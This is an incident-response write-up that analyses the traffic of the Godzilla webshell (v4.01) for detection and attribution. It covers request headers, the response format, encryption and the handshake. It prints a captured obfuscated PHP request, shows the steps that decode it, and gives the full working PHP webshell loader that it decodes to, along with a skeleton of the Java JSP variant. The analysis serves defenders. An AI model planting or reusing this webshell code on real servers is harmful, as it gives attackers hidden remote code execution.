---
title: "Godzilla Webshell Traffic Analysis and Attribution"
description: "Godzilla Webshell traffic analysis and attribution: request and response formats, encryption mechanisms, and incident-response detection methods."
date: 2025-06-15T00:00:00.000Z
tags:
  - "webshell"
  - "AntSword"
  - "Traffic Analysis"
  - "Incident Response"
authors:
  - "bx"
draft: false
slug: "k8x9w23-en"
lang: "en"
translationKey: "k8x9w23"
---

# Godzilla Webshell Traffic Analysis and Attribution

:::info
Godzilla version -- v4.01

:::

## Characteristics

 The Godzilla client is written in JAVA. If it is not configured, the request header may look like java..., but by default the request configuration is set, as shown below.

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744769883065-e73abd0b-f569-43da-b9c9-569e72e76c71.png)

The Cookie ends with a semicolon.

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744769989345-5c44dad7-64e0-4876-bcb8-33f32123a8fb.png)

The response body looks like this.

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744771118752-b0f36ee2-fec9-42ae-acf4-535f3646da41.png)

The specific format is:

first 16 characters of md5 + base64 + last 16 characters of md5

When the client connects for the first time, there are three consecutive requests.

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744771903895-d50c4e58-6e3c-42c7-991e-f75e2bcb9d0f.png)

Godzilla's encryption method is also based on the symmetric AES cipher.

## Detailed Analysis

### PHP

The encryption type is as follows.

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744771222544-3235fcfe-62c6-4840-a839-e3a47d5ba301.png)

Execute a command.

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744769721775-bd0b12ed-11f1-495d-b6da-2e33e284648f.png)

TCP traffic:

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744769734722-4c2d3cd1-ce5f-47ff-8f53-f724ad7d76d2.png)

```python
ant=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&key=fL1tMGI4YTljzn78f8Wo%2FyhTN1cCWEn3M%2BF4ZGJ%2BL2Iz5Ep7TupOFkzm%2Bhr7%2BbBk0Riq%2BC30rG0xAYdhAfgsHqr%2BKsEp9CxcgTffeJ98LEWt%2Bah9rnNgOQqYkoN%2FNGEz
```

Taking this as an example:

First URL-decode it.

Then reverse the string inside.

```python
input_str = ""
reversed_str = input_str[::-1]
print(f"反转后的字符串：{reversed_str}")

#DQpAc2Vzc2lvbl9zdGFydCgpOw0KQHNldF90aW1lX2xpbWl0KDApOw0KQGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIGVuY29kZSgkRCwkSyl7DQogICAgZm9yKCRpPTA7JGk8c3RybGVuKCREKTskaSsrKSB7DQogICAgICAgICRjID0gJEtbJGkrMSYxNV07DQogICAgICAgICREWyRpXSA9ICREWyRpXV4kYzsNCiAgICB9DQogICAgcmV0dXJuICREOw0KfQ0KJHBhc3M9J2tleSc7DQokcGF5bG9hZE5hbWU9J3BheWxvYWQnOw0KJGtleT0nM2M2ZTBiOGE5YzE1MjI0YSc7DQppZiAoaXNzZXQoJF9QT1NUWyRwYXNzXSkpew0KICAgICRkYXRhPWVuY29kZShiYXNlNjRfZGVjb2RlKCRfUE9TVFskcGFzc10pLCRrZXkpOw0KICAgIGlmIChpc3NldCgkX1NFU1NJT05bJHBheWxvYWROYW1lXSkpew0KICAgICAgICAkcGF5bG9hZD1lbmNvZGUoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0sJGtleSk7DQogICAgICAgIGlmIChzdHJwb3MoJHBheWxvYWQsImdldEJhc2ljc0luZm8iKT09PWZhbHNlKXsNCiAgICAgICAgICAgICRwYXlsb2FkPWVuY29kZSgkcGF5bG9hZCwka2V5KTsNCiAgICAgICAgfQ0KCQlldmFsKCRwYXlsb2FkKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDAsMTYpOw0KICAgICAgICBlY2hvIGJhc2U2NF9lbmNvZGUoZW5jb2RlKEBydW4oJGRhdGEpLCRrZXkpKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDE2KTsNCiAgICB9ZWxzZXsNCiAgICAgICAgaWYgKHN0cnBvcygkZGF0YSwiZ2V0QmFzaWNzSW5mbyIpIT09ZmFsc2Upew0KICAgICAgICAgICAgJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV09ZW5jb2RlKCRkYXRhLCRrZXkpOw0KICAgICAgICB9DQogICAgfQ0KfQ0K
```

Then Base64-decode it.

>  The code in the parameter only establishes a channel for receiving and executing subsequent encrypted instructions.

```python
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='key';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}

```

### Java

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744771408635-2ce3d5d1-e5ee-4d0a-8966-376c4216230d.png)

The processed format is as follows:

```java
<%!
String xc = "3c6e0b8a9c15224a";
String pass = "pass";
String md5 = md5(pass + xc);
class X extends ClassLoader { public Class Q(byte[] cb) { ... } }
public byte[] x(byte[] s, boolean m) { ... }
public static String md5(String s) { ... }
public static String base64Encode(byte[] bs) throws Exception { ... }
public static byte[] base64Decode(String bs) throws Exception { ... }
%>
<%
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
    %>

```

